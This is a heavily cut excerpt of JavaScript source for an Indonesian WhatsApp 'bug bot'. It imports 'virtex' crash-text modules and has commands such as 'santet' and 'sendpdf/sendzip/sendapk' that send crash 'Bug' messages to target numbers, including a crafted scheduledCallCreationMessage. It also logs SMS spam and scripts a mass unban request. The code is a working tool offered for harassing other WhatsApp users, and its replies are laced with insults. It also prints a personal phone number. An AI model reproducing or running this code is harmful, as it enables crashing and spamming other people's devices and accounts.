...
const { ngazap } = require('./basekece/virtex/ngazap')
const { buttonkal } = require('./basekece/virtex/buttonkal')
const { cttl } = require('./basekece/virtex/cttl')
const { tizi } = require('./basekece/virtex/tizi')
const { weg } = require('./basekece/virtex/weg')
const { virtex7 } = require('./basekece/virtex/virtex7')
...
const thumbnail = fs.readFileSync ('./basekece/image/mamak.jpg')
const thumb = fs.readFileSync ('./basekece/image/mamak.jpg')
const kalimage = fs.readFileSync ('./basekece/image/mamak.jpg')
...
const banned = JSON.parse(fs.readFileSync('./basekece/dbnye/banned.json'))

virgam = fs.readFileSync(`./basekece/image/deden.jpeg`)
//=================================================//
...
const reply = (teks) => {
return haikal.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `DEVELOPER ${botname}`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": 'https://telegra.ph/file/3e86f2c834ac0490a1231.jpg',"thumbnail": thumb,"sourceUrl": `https://wa.me/6282217841377?text=P+bng+makasih+bang+botnya😑😅`}}}, { quoted:m})} 
...
m.reply('*Rusak Bodoh !! Yang Bener Contoh : apkYS MODS WA*')
}
...
m.reply('*Rusak Bodoh !! Yang Bener Contoh : zipYS MODS WA*')
}
...
m.reply('*Rusak Bodoh !! Yang Bener Contoh : pdfYS MODS WA*')
}
...
text: `𝙷𝙰𝙸 𝙰𝙺𝚄 𝙱𝙾𝚃 𝙺𝙴𝙲𝙴 
𝙲𝚘𝚗𝚝𝚊𝚌𝚝 𝚖𝚎 : 082217841377
𝙸𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖  : https://www.instagram.com/cemas_ko/
𝚃𝚒𝚔𝚝𝚘𝚔         :https://www.tiktok.com/@asp.gamng278/
©𝑫𝒚𝒂𝒕 𝑲𝒆𝒄𝒆
•❒❒❒❒❒•
...
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan 𝑫𝒚𝒂𝒕 𝑲𝒆𝒄𝒆`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##
...
haikal.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: cap}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
m.reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 1 Menit Yah*`)
}
break
//=================================================
case 'santet':
...
if (!isCreator) return m.reply('*khusus Premium*')
await loading()
joauu = fs.readFileSync('./basekece/video/hwmods.mp4')
...
if (!isCreator) return m.reply('*khusus Premium*')
await loading()
joauuuuu = fs.readFileSync('./basekece/video/hwmods2.mp4')
...
case 'hw': { 
if (isBan) return m.reply('*Lu Di Ban Owner*')
joauuuuuuu = fs.readFileSync('./basekece/video/hwmods2.mp4')
...
await loading()
 if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
haikal.sendMessage(from, { text : `Haii 👋 Aku bot Kece
...
break
//=================================================//
case 'fuck': case 'ajg': case 'ngentod': case 'bangsad': case'anjing': case'babi': case'kontol': case'memek': case'penis': case 'ngewe': case 'yatim': case 'piatu': case 'pentil': case 'pepek': case 'tempi': case 'tempe': case 'bajingan': case 'ndasmu':{
if (!welcmm) return
if (!isBotAdmins) return m.reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
...
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) BY YsMods Wa MODS`);
});
}
...
case 'horrorblood':
case 'thunder':
if (args.length == 0) return reply(`Example: ${prefix + command} YsMods Wa`)
await loading()
...
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} YsMods Wa, 7, 7, 2005, Putri, 16, 11, 2004`
...
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} YsMods Wa Hw`
...
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} YsMods Wa, 7, 7, 2005`
...
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} YsMods Wa|Putri`
...
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} YsMods Wa, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
...
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} YsMods Wa, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
...
teksoooo = `│\n└────────────⭓\n\n*Total ada : ${docunye.length} \n\n Contoh 1 : sendpdf YsMods Wa + sambil reply pesan target* \n\n Contoh 2 : yopdf YsMods Wa`
m.reply(teksoooo)
}
break
//=================================================//
...
teksooooo = `│\n└────────────⭓\n\n*Total ada : ${zipnye.length} \n\n Contoh 1 : sendzip YsMods Wa + sambil reply pesan target* \n\n Contoh 2 : yozip YsMods Wa`
m.reply(teksooooo)
}
break
//=================================================//
...
teksoooooo = `│\n└────────────⭓\n\n*Total ada : ${apknye.length} \n\n Contoh 1 : sendapk YsMods Wa + sambil reply pesan target* \n\n Contoh 2 : yoapk YsMods Wa`
m.reply(teksoooooo)
}
break
//=================================================//
